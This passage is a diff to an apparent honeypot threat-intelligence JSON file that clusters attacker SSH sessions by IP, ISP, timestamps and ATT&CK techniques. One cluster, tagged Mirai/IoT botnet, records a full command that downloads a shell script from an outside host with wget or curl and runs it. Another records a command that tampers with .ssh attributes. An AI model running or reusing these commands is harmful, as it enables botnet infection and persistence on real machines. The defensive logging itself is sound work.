+        "143.110.145.158",
+        "4.206.92.183",
+        "67.52.95.38",
+        "103.43.191.43",
+        "144.31.185.241",
+        "172.174.17.234"
       ],
-      "unique_ip_count": 28,
+      "unique_ip_count": 10,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -1909,330 +827,99 @@
       ],
       "members": [
         {
-          "session_id": "IR-42d4b887ecc1",
-          "src_ip": "150.136.104.48",
-          "country": "US",
-          "isp": "Oracle Public Cloud",
-          "command_count": 2,
-          "timestamp": "2026-11-17T05:00:30.147491Z"
-        },
-        {
-          "session_id": "IR-ea6b407ded11",
-          "src_ip": "103.176.20.115",
-          "country": "VN",
-          "isp": "GIAP BICH NGOC COMMUNICATION COMPANY LIMITED",
-          "command_count": 2,
-          "timestamp": "2026-11-17T06:13:48.894202Z"
-        },
-        {
-          "session_id": "IR-11f1b8608060",
-          "src_ip": "107.161.82.45",
-          "country": "US",
-          "isp": "RackNerd LLC",
-          "command_count": 2,
-          "timestamp": "2026-11-17T06:23:07.193381Z"
-        },
-        {
-          "session_id": "IR-6c3d6c33475e",
-          "src_ip": "220.247.224.226",
-          "country": "LK",
-          "isp": "INTERNET DATA CENTER - SRI LANKA TELECOM",
-          "command_count": 2,
-          "timestamp": "2026-11-17T06:34:27.716132Z"
-        },
-        {
-          "session_id": "IR-90306b349c43",
-          "src_ip": "181.48.105.218",
-          "country": "CO",
-          "isp": "Telmex Colombia S.A.",
-          "command_count": 2,
-          "timestamp": "2026-11-17T06:44:57.939723Z"
-        },
-        {
-          "session_id": "IR-91428f736c88",
-          "src_ip": "103.248.120.6",
-          "country": "IN",
-          "isp": "Shivansh Infotech pvt Ltd",
-          "command_count": 2,
-          "timestamp": "2026-11-17T06:56:32.893566Z"
-        },
-        {
-          "session_id": "IR-70923bd67768",
-          "src_ip": "203.145.143.163",
-          "country": "IN",
-          "isp": "Bharti Hexacom Limited",
-          "command_count": 2,
-          "timestamp": "2026-11-17T07:25:58.267814Z"
-        },
-        {
-          "session_id": "IR-dd4013b8f632",
-          "src_ip": "46.101.137.209",
-          "country": "DE",
-          "isp": "DigitalOcean, LLC",
-          "command_count": 2,
-          "timestamp": "2026-11-17T08:34:23.908431Z"
-        },
-        {
-          "session_id": "IR-47ddc3c065ad",
-          "src_ip": "128.1.198.78",
-          "country": "FI",
-          "isp": "Zenlayer Inc",
-          "command_count": 2,
-          "timestamp": "2026-11-17T08:35:27.928999Z"
-        },
-        {
-          "session_id": "IR-37b4875c452c",
-          "src_ip": "51.178.43.161",
-          "country": "FR",
-          "isp": "OVH SAS",
-          "command_count": 2,
-          "timestamp": "2026-11-17T08:45:36.825712Z"
-        },
-        {
-          "session_id": "IR-941d2ffc741c",
-          "src_ip": "72.240.125.133",
-          "country": "US",
-          "isp": "Buckeye Cablevision, Inc.",
-          "command_count": 2,
-          "timestamp": "2026-11-17T08:49:11.920962Z"
-        },
-        {
-          "session_id": "IR-1da7c956f842",
-          "src_ip": "73.241.158.44",
-          "country": "US",
-          "isp": "Comcast IP Services, L.L.C.",
-          "command_count": 2,
-          "timestamp": "2026-11-17T09:03:58.859660Z"
-        },
-        {
-          "session_id": "IR-9aa91d5fe074",
-          "src_ip": "103.172.236.15",
-          "country": "VN",
-          "isp": "HERAL SCIENCE AND TECHNOLOGY JOINT STOCK COMPANY",
-          "command_count": 2,
-          "timestamp": "2026-11-17T09:04:00.953756Z"
-        },
-        {
-          "session_id": "IR-f77420d21a25",
-          "src_ip": "202.165.25.43",
-          "country": "MY",
-          "isp": "TM ONE Cloud Alpha Edge",
-          "command_count": 2,
-          "timestamp": "2026-11-17T09:23:52.022325Z"
-        },
-        {
-          "session_id": "IR-21b02eff2fbb",
-          "src_ip": "96.78.175.36",
-          "country": "US",
-          "isp": "Comcast Cable Communications, LLC",
-          "command_count": 2,
-          "timestamp": "2026-11-17T10:06:54.766720Z"
-        },
-        {
-          "session_id": "IR-66ec8944ed7b",
-          "src_ip": "68.210.120.110",
-          "country": "AT",
+          "session_id": "IR-ca12e2217bec",
+          "src_ip": "4.206.92.183",
+          "country": "CA",
           "isp": "Microsoft Corporation",
           "command_count": 2,
-          "timestamp": "2026-11-17T12:08:23.078868Z"
+          "timestamp": "2026-11-18T00:25:47.752905Z"
         },
         {
-          "session_id": "IR-58045c3edb56",
-          "src_ip": "103.195.236.196",
-          "country": "VN",
-          "isp": "AZ VIET NAM COMMUNICATIONS TECHNOLOGY COMPANY LIMITED",
+          "session_id": "IR-8e62e6ec5657",
+          "src_ip": "103.43.191.43",
+          "country": "HK",
+          "isp": "West263 International Limited",
           "command_count": 2,
-          "timestamp": "2026-11-17T12:14:03.766717Z"
+          "timestamp": "2026-11-18T00:26:40.631484Z"
         },
         {
-          "session_id": "IR-5a558c91a5af",
-          "src_ip": "101.96.195.17",
+          "session_id": "IR-f21d8be2bf43",
+          "src_ip": "43.157.200.91",
+          "country": "ID",
+          "isp": "Tencent Building, Kejizhongyi Avenue",
+          "command_count": 2,
+          "timestamp": "2026-11-18T00:26:56.657990Z"
+        },
+        {
+          "session_id": "IR-1dcdd7193760",
+          "src_ip": "152.32.218.149",
+          "country": "SG",
+          "isp": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+          "command_count": 2,
+          "timestamp": "2026-11-18T01:34:18.595730Z"
+        },
+        {
+          "session_id": "IR-88a894a238b6",
+          "src_ip": "50.6.241.208",
+          "country": "CA",
+          "isp": "Newfold Digital, Inc.",
+          "command_count": 2,
+          "timestamp": "2026-11-18T01:36:05.453899Z"
+        },
+        {
+          "session_id": "IR-d4586ba642e9",
+          "src_ip": "144.31.185.241",
+          "country": "FI",
+          "isp": "CHSL Helsinki",
+          "command_count": 2,
+          "timestamp": "2026-11-18T01:40:57.701004Z"
+        },
+        {
+          "session_id": "IR-463ce9f5b554",
+          "src_ip": "67.52.95.38",
+          "country": "US",
+          "isp": "HILTON GRAND VACATIONS CLUB",
+          "command_count": 2,
+          "timestamp": "2026-11-18T02:01:41.188521Z"
+        },
+        {
+          "session_id": "IR-7d322c0cb472",
+          "src_ip": "143.110.145.158",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 2,
+          "timestamp": "2026-11-18T02:06:53.067731Z"
+        },
+        {
+          "session_id": "IR-76bcbd0a6147",
+          "src_ip": "14.103.123.67",
           "country": "CN",
           "isp": "Beijing Volcano Engine Technology Co., Ltd.",
           "command_count": 2,
-          "timestamp": "2026-11-17T12:15:31.382185Z"
+          "timestamp": "2026-11-18T03:49:13.532464Z"
         },
         {
-          "session_id": "IR-ca0bbdbb14dd",
-          "src_ip": "114.217.10.60",
-          "country": "CN",
-          "isp": "Chinanet Jiangsu Province Network",
-          "command_count": 2,
-          "timestamp": "2026-11-17T12:30:51.044889Z"
-        },
-        {
-          "session_id": "IR-fe95878ea886",
-          "src_ip": "113.161.79.218",
-          "country": "VN",
-          "isp": "Vietnam Posts and Telecommunications Group",
-          "command_count": 2,
-          "timestamp": "2026-11-17T14:13:37.155383Z"
-        },
-        {
-          "session_id": "IR-934d55945f69",
-          "src_ip": "171.244.201.80",
-          "country": "VN",
-          "isp": "Viettel Group",
-          "command_count": 2,
-          "timestamp": "2026-11-17T14:51:14.365584Z"
-        },
-        {
-          "session_id": "IR-dbaf82fb8ed3",
-          "src_ip": "43.165.190.208",
-          "country": "JP",
-          "isp": "ACEVILLE PTE.LTD.",
-          "command_count": 2,
-          "timestamp": "2026-11-17T14:52:12.277470Z"
-        },
-        {
-          "session_id": "IR-21564d76fbf3",
-          "src_ip": "4.221.162.168",
-          "country": "ZA",
-          "isp": "Microsoft Corporation",
-          "command_count": 2,
-          "timestamp": "2026-11-17T14:54:11.092271Z"
-        },
-        {
-          "session_id": "IR-bf6e675b0da7",
-          "src_ip": "107.189.23.48",
-          "country": "NL",
-          "isp": "RouterHosting LLC",
-          "command_count": 2,
-          "timestamp": "2026-11-17T14:55:53.180624Z"
-        },
-        {
-          "session_id": "IR-998633955603",
-          "src_ip": "94.182.168.149",
-          "country": "IR",
-          "isp": "SHTL-NET-DED",
-          "command_count": 2,
-          "timestamp": "2026-11-17T14:59:15.188878Z"
-        },
-        {
-          "session_id": "IR-d4a0545744aa",
-          "src_ip": "159.223.97.218",
+          "session_id": "IR-6f82b1841ec9",
+          "src_ip": "172.174.17.234",
           "country": "US",
-          "isp": "DigitalOcean, LLC",
+          "isp": "Microsoft Limited",
           "command_count": 2,
-          "timestamp": "2026-11-17T15:45:20.763437Z"
-        },
-        {
-          "session_id": "IR-d7a74aebce23",
-          "src_ip": "117.50.51.198",
-          "country": "CN",
-          "isp": "Shanghai UCloud Information Technology Company Limited",
-          "command_count": 2,
-          "timestamp": "2026-11-17T15:52:11.490874Z"
-        },
-        {
-          "session_id": "IR-c0c816f75f0d",
-          "src_ip": "106.12.9.42",
-          "country": "CN",
-          "isp": "Beijing Baidu Netcom Science and Technology Co., Ltd.",
-          "command_count": 2,
-          "timestamp": "2026-11-17T18:39:52.854820Z"
+          "timestamp": "2026-11-18T04:43:56.299302Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-049",
+      "cluster_id": "CLU-020",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 2,
+      "session_count": 92,
       "unique_ips": [
-        "85.198.19.217",
-        "58.208.84.103"
-      ],
-      "unique_ip_count": 2,
-      "sequence_hash": "c32b4937ce8564ea",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        }
-      ],
-      "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
-      ],
-      "members": [
-        {
-          "session_id": "IR-00eb123e32ad",
-          "src_ip": "85.198.19.217",
-          "country": "IR",
-          "isp": "Asiatech Data Transmission company",
-          "command_count": 1,
-          "timestamp": "2026-11-17T04:55:09.895618Z"
-        },
-        {
-          "session_id": "IR-080e8b7333f6",
-          "src_ip": "58.208.84.103",
-          "country": "CN",
-          "isp": "CHINANET jiangsu province network",
-          "command_count": 1,
-          "timestamp": "2026-11-17T16:12:46.170073Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-050",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 6,
-      "unique_ips": [
-        "78.128.112.74"
+        "109.160.32.171"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "05517be7b140a37f",
-      "ttps": [],
-      "representative_commands": [
-        "echo 'SSH check'"
-      ],
-      "members": [
-        {
-          "session_id": "IR-2532de36c663",
-          "src_ip": "78.128.112.74",
-          "country": "BG",
-          "isp": "Lir.bg EOOD",
-          "command_count": 1,
-          "timestamp": "2026-11-17T05:35:29.417938Z"
-        },
-        {
-          "session_id": "IR-df119bfe2a0d",
-          "src_ip": "78.128.112.74",
-          "country": "BG",
-          "isp": "Lir.bg EOOD",
-          "command_count": 1,
-          "timestamp": "2026-11-17T10:10:58.594465Z"
-        },
-        {
-          "session_id": "IR-1310d68fe694",
-          "src_ip": "78.128.112.74",
-          "country": "BG",
-          "isp": "Lir.bg EOOD",
-          "command_count": 1,
-          "timestamp": "2026-11-17T14:39:01.689321Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-051",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2115,
-      "unique_ips": [
-        "109.160.32.103",
-        "109.160.32.200"
-      ],
-      "unique_ip_count": 2,
       "sequence_hash": "7ab552f01de999cb",
       "ttps": [
         {
@@ -2245,36 +932,159 @@
       ],
       "members": [
         {
-          "session_id": "IR-3117ce553579",
-          "src_ip": "109.160.32.200",
+          "session_id": "IR-886133147124",
+          "src_ip": "109.160.32.171",
           "country": "DE",
           "isp": "Global Communication Net Plc",
           "command_count": 1,
-          "timestamp": "2026-11-17T08:12:03.038311Z"
+          "timestamp": "2026-11-18T01:04:32.928205Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-021",
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 1,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 1,
+      "unique_ips": [
+        "160.119.66.206"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "1936536bf3c3d5e7",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         },
         {
-          "session_id": "IR-5c84cc81adf3",
-          "src_ip": "109.160.32.103",
-          "country": "DE",
-          "isp": "Global Communication Net Plc",
-          "command_count": 1,
-          "timestamp": "2026-11-17T08:44:02.514265Z"
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
         },
         {
-          "session_id": "IR-64ed0172288a",
-          "src_ip": "109.160.32.200",
-          "country": "DE",
-          "isp": "Global Communication Net Plc",
-          "command_count": 1,
-          "timestamp": "2026-11-17T10:00:01.154935Z"
-        },
+          "id": "T1059.004",
+          "name": "T1059.004"
+        }
+      ],
+      "representative_commands": [
+        "cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&"
+      ],
+      "members": [
         {
-          "session_id": "IR-e2264db092cf",
-          "src_ip": "109.160.32.103",
-          "country": "DE",
-          "isp": "Global Communication Net Plc",
+          "session_id": "IR-fa3300862d6e",
+          "src_ip": "160.119.66.206",
+          "country": "NL",
+          "isp": "HostMem",
           "command_count": 1,
-          "timestamp": "2026-11-17T10:00:03.036347Z"
+          "timestamp": "2026-11-18T01:20:35.864570Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-022",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "117.250.233.20"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c3ca32ad5cf1",
+          "src_ip": "117.250.233.20",
+          "country": "IN",
+          "isp": "ESIC Sub Regional Office Trivandrum",
+          "command_count": 1,
+          "timestamp": "2026-11-18T04:04:24.691242Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-023",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "92.118.39.72"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "28ba533b0f3c4df6",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -a"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c32cdd374bb1",
+          "src_ip": "92.118.39.72",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 1,
+          "timestamp": "2026-11-18T04:05:43.150745Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-024",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "78.128.112.74"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "05517be7b140a37f",
+      "ttps": [],
+      "representative_commands": [
+        "echo 'SSH check'"
+      ],
+      "members": [
+        {
+          "session_id": "IR-5fd0d121558c",
+          "src_ip": "78.128.112.74",
+          "country": "BG",
+          "isp": "Lir.bg EOOD",
+          "command_count": 1,
+          "timestamp": "2026-11-18T04:08:31.008437Z"
         }
       ]
     }
